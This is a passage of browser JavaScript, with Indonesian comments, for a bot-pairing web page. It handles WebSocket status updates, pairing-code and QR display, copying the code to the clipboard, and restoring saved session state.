        try { d = JSON.parse(ev.data); } catch (e) { return; }
        if (!d) return;
        if (d.type === 'hello') {
          if (d.botVersion) { var bv = $('botVersion'); if (bv) bv.textContent = d.botVersion; }
          return;
        }
        if (d.type === 'status') {
          // Hanya terapkan status untuk nomor yang sedang aktif (atau bila nomor belum diisi).
          if (d.phone && state.phone && d.phone !== state.phone) return;
          applyStatus(d);
        }
      });
      ws.addEventListener('close', function () {
        setTimeout(connectWs, wsRetryMs);
        wsRetryMs = Math.min(wsRetryMs * 2, 10000);
      });
      ws.addEventListener('error', function () { try { ws.close(); } catch (e) { /* abaikan */ } });
    } catch (e) { setTimeout(connectWs, 5000); }
  }

  /* ---------------- Init ---------------- */
  function initActions() {
    var cb = $('cancelBtn'); if (cb) cb.addEventListener('click', cancelPairing);
    var cc = $('cancelCodeBtn'); if (cc) cc.addEventListener('click', cancelPairing);
    var cq = $('cancelQrBtn'); if (cq) cq.addEventListener('click', cancelPairing);
    var vs = $('viewSessionBtn');
    if (vs) vs.addEventListener('click', function () {
      hideOverlay();
      var rb = $('resultBlock');
      if (rb) rb.scrollIntoView({ behavior: 'smooth', block: 'start' });
    });
    var co = $('closeOverlayBtn'); if (co) co.addEventListener('click', hideOverlay);
    var so = $('sendOwnerBtn'); if (so) so.addEventListener('click', sendToOwner);
    var lo = $('logoutBtn'); if (lo) lo.addEventListener('click', logoutSession);
    var rs = $('resetBtn'); if (rs) rs.addEventListener('click', function () { resetAll(true); });
    var cp = $('copyCodeBtn');
    if (cp) cp.addEventListener('click', function () {
      var raw = String(state.code || '').replace(/[^A-Z0-9]/gi, '').toUpperCase();
      if (!raw) return;
      var done = function () {
        cp.textContent = 'Disalin ✓';
        setTimeout(function () { cp.textContent = 'Salin Tanpa Strip'; }, 1500);
      };
      if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(raw).then(done).catch(function () { fallbackCopy(raw); done(); });
      } else { fallbackCopy(raw); done(); }
    });
  }

  function fallbackCopy(text) {
    try {
      var ta = document.createElement('textarea');
      ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
      document.body.appendChild(ta); ta.select();
      document.execCommand('copy');
      document.body.removeChild(ta);
    } catch (e) { /* abaikan */ }
  }

  function restoreSaved() {
    var s = loadState();
    if (!s) return;
    state.method = s.method || null;
    state.codeMode = s.codeMode || 'random';
    state.customCode = s.customCode || '';
    var input = $('phoneInput');
    if (input && s.phone) {
      input.value = s.phone;
      validatePhone();
    }
    if (state.method) selectMethod(state.method);
    var radios = $$('input[name="codeMode"]');
    radios.forEach(function (r) { r.checked = r.value === state.codeMode; });
    var wrap = $('customCodeWrap');
    if (wrap) wrap.hidden = state.codeMode !== 'custom';
    var ci = $('customCodeInput');
    if (ci && state.customCode) { ci.value = state.customCode; refreshCustomPreview(); }
    // Pulihkan kode/QR yang masih berlaku (wall-clock).
    if (s.expiresAt && s.expiresAt > Date.now() && (s.code || s.qrDataUrl)) {
      state.code = s.code || '';
      state.qrDataUrl = s.qrDataUrl || '';
      state.expiresAt = s.expiresAt;
      state.totalSeconds = s.totalSeconds || 180;
      state.status = s.status === 'awaiting_qr' ? 'awaiting_qr' : 'awaiting_code';
      state.botNumber = s.botNumber || '';
      if (state.status === 'awaiting_qr') showQrArea(); else showCodeArea();
      logLine('Sesi dipulihkan — kode masih berlaku.');
    } else if (s.status === 'connected' || s.status === 'delivering' || s.status === 'delivered_disconnected') {
      state.status = s.status;
      state.botNumber = s.botNumber || '';
      var rb = $('resultBlock'); if (rb) rb.hidden = false;
      renderPipeline(); renderDelivery();
    }
    updateRequestBtn();
  }

  document.addEventListener('DOMContentLoaded', function () {
    initTheme();
    tickClock();
    setInterval(tickClock, 1000);
    initPresence();
    initHealth();
    initPhoneInput();
    initMethodUI();
    initActions();
    loadOperators();
    restoreSaved();
    renderPipeline();
    startCountdown();
    connectWs();
  });
})();
